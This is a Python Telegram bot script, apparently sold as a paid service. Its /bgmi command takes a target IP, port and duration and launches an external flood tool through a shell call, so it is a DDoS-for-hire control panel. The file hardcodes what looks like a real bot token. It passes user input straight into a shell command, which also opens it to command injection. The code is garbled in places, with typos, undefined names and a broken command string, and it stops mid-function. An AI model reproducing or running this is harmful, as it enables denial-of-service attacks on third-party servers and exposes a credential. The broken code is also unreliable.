#script by @CONFIG OF SRK

import subprocess
import datetime
import os
import telebot
import time
import threading
import time
import random
import string
from telebot import TeleBot
from telebot import types
import sys

# insert your Telegram bot token here
bot = telebot.TeleBot('7501709795:AAG0KnUWl6DAAzcczvujwBw5pUDUDrLnC6Y')

API_TOKEN = '7501709795:AAG0KnUWl6DAAzcczvujwBw5pUDUDrLnC6Y'  # Replace with your bot's API token
bot = telebot.TeleBot(API_TOKEN)

# Define the owner's user ID
OWNER_ID = 1232047106  # Replace with your actual Telegram user ID
# Admin user IDs
admin_id = ["'1232047106'"]
# Replace with your actual admin user IDs
ADMIN_IDS = [1232047106]  # Example admin user ID

# File to store allowed user IDs
USER_FILE = "users.txt"

# Define a dictionary to store keys and their validity status
keys = {}


# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def raed_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["1232047106"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ‚ùå."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ‚úÖ"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry +=f" | Target: {target}"
    if port:
        log_entry +=f" | Port: {port}"
    if time:
        log_entry +=f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expirY_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approvaal_expiry_date(user_to_add, duration, time_unit):
                    response = f"üíê HELLO {user_to_add}!\nüéâ CONGRATULATIONS! YOU'RE APPROVED ‚úÖ \nüåü WELCOME TO THE SRK TEAM!\nüöÄ GET READY TO ENJOY ALL THE EXCLUSIVE FEATURES!\nüë§ APPROVED BY @OWNERSRK\n\nAPPROVED FOR{duration} {time_unit}\n‚ö°\nACCESS WILL BE ACTIVE UNTIL{user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} üëç.\n\nüí´ LET THE FUN BEGIN! üéä."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists ü§¶‚Äç‚ôÇÔ∏è."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add üòò."
    else:
        response = "You have not purchased yet purchase now from:- @OWNERSRK."

    bot.reply_to(message, response)

@Bot.message_handler(commands=['myinfo'])
def send_user_info(message):
    bot.reply_to(message, "CHECKING YOUR WHOLE INFO....")
    time.sleep(3)  # Simulate a delay for checking info

    user_info = f"""
    Username: @{message.from_user.username}
    User ID: {message.from_user.id}
    First Name: {message.from_user.first_name}
    Last Name: {message.from_user.last_name if message.from_user.last_name else 'N/A'}
    Last Seen: (This information is not available due to privacy settings)
    Status: (This information is not available)
    Admin: {'Yes' if message.from_user.id in ADMIN_IDS else 'No'}
    Used this bot: {'Yes' if user_used_bot(message.from_user.id) else 'No'}
    """
    
    bot.send_message(message.chat.id, user_info)

def user_used_bot(user_id):
    # Implement logic to check if the user has used the bot before
    return False  # Placeholder

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully üëç."
            else:
                response = f"User {user_to_remove} not found in the list ‚ùå."
        else:
            response = '''Please Specify A User ID to Remove. 
‚úÖ Usage: /remove <userid>'''
    else:
        response = "You have not purchased yet purchase now from:- @OWNERSRK üôá."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ‚ùå."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ‚úÖ"
        except FileNotFoundError:
            response = "Logs are already cleared ‚ùå."
    else:
        response = "You have not purchased yet purchase now from :- @OWNERSRK ‚ùÑ."
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ‚ùå."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ‚úÖ"
        except FileNotFoundError:
            response = "users are already cleared ‚ùå."
    else:
        response = "Íú∞ Ä·¥á·¥á ·¥ã·¥á ·¥Ö ú·¥Ä Ä·¥ç Íú± ú·¥Ä ü·¥Ä  ú·¥Ä…™ ·¥ã è·¥Ä ·¥ä·¥è ·¥ç·¥ú ·¥ú·¥õ·¥õ ú·¥Ä ·¥ã·¥Ä…™ ·¥ã ú…™  ô ú…™ …¢·¥úÍú±  Ä ú·¥Ä…™  ú·¥è  ô·¥ú è ·¥ã Ä·¥è Íú∞ Ä·¥á·¥á ·¥ç·¥Ä…™ ·¥ã·¥ú·¥Ñ ú …¥ ú…™ ·¥ç…™ ü·¥õ·¥Ä  ô·¥ú è:- @OWNERSRK üôá."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ‚ùå"
        except FileNotFoundError:
            response = "No data found ‚ùå"
    else:
        response = "Íú∞ Ä·¥á·¥á ·¥ã·¥á ·¥Ö ú·¥Ä Ä·¥ç Íú± ú·¥Ä ü·¥Ä  ú·¥Ä…™ ·¥ã è·¥Ä ·¥ä·¥è ·¥ç·¥ú ·¥ú·¥õ·¥õ ú·¥Ä ·¥ã·¥Ä…™ ·¥ã ú…™  ô ú…™ …¢·¥úÍú±  Ä ú·¥Ä…™  ú·¥è  ô·¥ú è ·¥ã Ä·¥è Íú∞ Ä·¥á·¥á ·¥ç·¥Ä…™ ·¥ã·¥ú·¥Ñ ú …¥ ú…™ ·¥ç…™ ü·¥õ·¥Ä  ô·¥ú è:- @OWNERSRK‚ùÑ."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ‚ùå."
                bot.reply_to(message, response)
        else:
            response = "No data found ‚ùå"
            bot.reply_to(message, response)
    else:
        response = "ùôèùôùùôûùô® ùòΩùô§ùô© ùôûùô® ùô§ùô£ùô°ùôÆ ùôõùô§ùôß ùô•ùôñùôûùôô ùô™ùô®ùôöùôßùô® ùôóùô™ùôÆ ùô£ùô§ùô¨ ùôõùôßùô§ùô¢ - @OWNERSRK \n205 KALA JADU "
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"üå† STRATEGY DEPLOYED üå†\n\nüöÄ TARGET LOCKED [ ON YOUR SERVER ]... üí•\n‚öî BATTLE HAS COMMENCED ‚öî\n\nü•∑ ASSAULTING HOST ==) ( {target} )\nü•∑ ENGAGED PORT ==) ( {port} )\n‚è∞ ATTACK DURATION -> ( {time} ) SECONDS üî•\n\nüíé EXECUTED BY SRK TEAM ‚öî\n\nnHOLD YOUR POSITION, NO ACTION NEEDED FOR {time} SECONDS\nTHANK YOU FOR UTILIZING AUR HAX üí´\n\nü©≤‡§Ü‡§ú ‡§ö‡§°‡•ç‡§°‡•Ä ‡§®‡§π‡•Ä‡§Ç ‡§™‡§π‡§®‡•á ‡§π‡•ã ‡§®‡§æü©≤\n\n·¥Ö·¥á·¥†·¥á ü·¥è·¥ò·¥á Ä :--> @OWNERSRK"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =10

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "‚è≥ 10-ùô®ùôöùôòùô§ùô£ùôô ùôòùô§ùô§ùô°ùôôùô§ùô¨ùô£ ùôûùô® ùô£ùô§ùô¨ ùôñùô•ùô•ùô°ùôûùôöùôô!\nüîÑ ùôíùôñùôûùô© ùôñùô£ùôô ùôúùôñùô©ùôö ùô©ùôùùôö ùô¢ùô§ùô¢ùôöùô£ùô©\n‚è≥ ùôÄùô£ùôüùô§ùôÆ ùô©ùôùùôö ùôöùô£ùôôùô°ùôöùô´ùô§ùôß ùôßùôûùôôùôö!\n\n·¥Ö·¥á·¥†·¥á ü·¥è·¥ò·¥á Ä :--> @OWNERSRK"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 300:
                response = "‚ö†Ô∏è ùôÄùôßùôßùô§ùôß: ùôèùôûùô¢ùôö ùôûùô£ùô©ùôöùôßùô´ùôñùô° ùô¢ùô™ùô®ùô© ùôóùôö ùô°ùôöùô®ùô® ùô©ùôùùôñùô£ 300.\nüîç ùòæùôùùôöùôòùô† ùôÆùô§ùô™ùôß ùôûùô£ùô•ùô™ùô© ùôñùô£ùôô ùô¨ùôöùô°ùô° ùôñùôôùôüùô™ùô®ùô© ùô©ùôùùôö ùôùùôñùô£ùôôùô°ùôöùôô ùô©ùôûùô¢ùôö.\n‚úîÔ∏è ùòøùô§ùô£'ùô© ùôùùôöùô®ùôûùô©ùôñùô©ùôö ùô©ùô§ ùô®ùôöùôö ùôöùôìùô•ùôöùôßùô© ùôûùô£ùôõùô§ ùôõùô§ùôß ùô¨ùô§ùôßùô†ùô®ùôùùô§ùô•ùô®.."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f {target} {port} {time} 100"
                # Run the external command
                process = subprocess.run(full_command, shell=True)
                # Handle the response
                response = f"‚ö†Ô∏è ùôèùòºùôçùôÇùôÄùôè ùòøùôÄùôèùòºùôÑùôáùôé ‚ö†Ô∏è\n\n‚úÖ ùòºùôèùôèùòºùòæùôÜ ùôÅùôÑùôâùôÑùôéùôÉùôÄùòø\nüîç ùôèùòºùôçùôÇùôÄùôè: {target}\nüîå ùôãùôäùôçùôè: {port}\n\nüïí ùôèùôÑùôàùôÄ: {time}\n\nüî• ùôáùôöùô© ùô©ùôùùôö ùôòùôùùôñùô§ùô® ùô™ùô£ùôõùô§ùô°ùôô. ùôÄùô´ùôöùôßùôÆ ùôòùô°ùô§ùô™ùôô ùô§ùôõ ùôôùôöùô®ùô§ùô°ùôñùô©ùôûùô§ùô£ ùô£ùô§ùô¨ ùôôùôñùôßùô†ùôöùô£ùô®\n\nüí• ùôÇùôûùô´ùôö ùô£ùô§ ùô´ùô§ùôûùôòùôö ùô©ùô§ ùô®ùô©ùôßùôûùô≠ ùôõùô§ùôß ùô°ùôûùô£ùô™ùô®! üö® ùòøùôûùôéùòæùôäùôâùôèùôÄùôâùôè üè¥‚Äç‚ò†Ô∏è\n\nüëÅÔ∏è ùôíùòºùôèùòæùôÉ ùô§ùô™ùô© ùôõùô§ùôß ùôßùôöùô©ùô°ùôñùô©ùôûùô§ùô£ùô®! ‡§Ü‡§ú ‡§ö‡§°‡•ç‡§°‡•Ä ‡§®‡§π‡•Ä‡§Ç ‡§™‡§π‡§®‡•á ‡§π‡•ã ‡§®‡§æ."
                bot.send_message(message.chat.id, "SEND FEEDBACK üò°")
        else:
            response = "üìù DEAR USERS \n\nüìú USAGE DETAILS:\n/bgmi <IP> <PORT> <TIME>\n\n‚ú® EXAMPLE:\n- /bgmi 20.0.0.0 8700 120\n\n‚öîÔ∏è LET'S THE WAR BEGIN!\n\nüîç MORE INFORMATION:\n- <IP>: Target's IP address\n- <PORT>: Specific port for the attack\n- <TIME>: Duration of the attack in seconds\n\n‚ùóÔ∏è USE RESPONSIBLY!\n\n·¥õ ú…™ùô®  ô·¥è·¥õ ·¥è·¥°…¥·¥á Ä ‚ù§Ô∏è‚Äçü©π:--> @OWNERSRK"  # Updated command syntax
    else:
        response = ("üö´ UNAUTHORIZED ACCESS! üö´\n\nNoops! It seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks, you can:\n\nüîë VERIFY YOUR PERMISSIONS\nüìù REQUEST ACCESS FROM AN ADMIN\n\nüìû IF YOU STILL NEED HELP, CONTACT SUPPORT.Íú±!\n\nùêèùêéùêñùêÑùêëùêÑùêÉ ùêÅùêò @OWNERSRK\n\nü©≤‡§Ü‡§ú ‡§ö‡§°‡•ç‡§°‡•Ä ‡§®‡§π‡•Ä‡§Ç ‡§™‡§π‡§®‡•á ‡§π‡•ã ‡§®‡§æü©≤")
        bot.send_message(message.chat.id, "DM TO BUY ACCES :- @OWNERSRK ‚úÖ")
    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "‚ùå No Command Logs Found For You ‚ùå."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command üò°."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def send_help_message(message):
    bot.send_message(message.chat.id, "It seems like you would like more information! Here‚Äôs what each command does")
    time.sleep(0.5)  # Wait for 0.5 seconds

    bot.send_message(message.chat.id, "üí• /bgmi : Initiate an attack on your target. Be prepared for the results! üöÄ")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "üí• /rules : Review the rules to understand the guidelines and regulations of the platform. ‚öñÔ∏è")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "üí• /mylogs : Check your activity logs to track your actions and engagements. üìú")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "üí• /plan : Explore the different plans available to enhance your experience. üåü")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "üí• /myinfo : Access details about your account, including settings and status. üîç")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "üí• /admincmd : (Admins only) View all available commands meant for admin users. üìã")
    time.sleep(0.1)  # Wait for 0.1 seconds
    
    bot.send_message(message.chat.id, "If you need any specific command to be executed or further information, just let me know!")


keys = {}

def generate_key(days):
    return f"KEY-{days}-DAYS"

@bot.message_handler(commands=['genkey'])
def genkey_command(message):
    if message.from_user.id != OWNER_ID:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")
        return
    
    try:
        # Extract days from the command
        parts = message.text.split()
        days = int(parts[1])  # Example: /genkey 99
        new_key = generate_key(days)
        keys[new_key] = True  # Store key as valid
        bot.send_message(message.chat.id, f"Generated key: {new_key}")

    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "Usage: /genkey <number of days>")

@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    key_to_redeem = message.text.split(maxsplit=1)

    if len(key_to_redeem) != 2:
        response = "Usage: /redeem <key>"
        bot.send_message(message.chat.id, response)
        return 

    key_value = key_to_redeem[1]

    if key_value in keys:
        if keys[key_value]:
            response = f"Key '{key_value}' redeemed successfully!"
            keys[key_value] = False  # Mark key as used
        else:
            response = f"Key '{key_value}' has already been redeemed."
    else:
        response = "Invalid key. Please check and try again."

    bot.send_message(message.chat.id, response)


@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ‚ö†Ô∏è:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. MAKE SURE YOU JOINED PRIVATE  OTHERWISE NOT WORK
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)




@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "üéâ Welcome to the Bot! It's now online! ‚úÖ")
    time.sleep(0.2)  
    bot.send_message(message.chat.id, "üëë Owner of this bot is the one and only: @OWNERSRK")
    t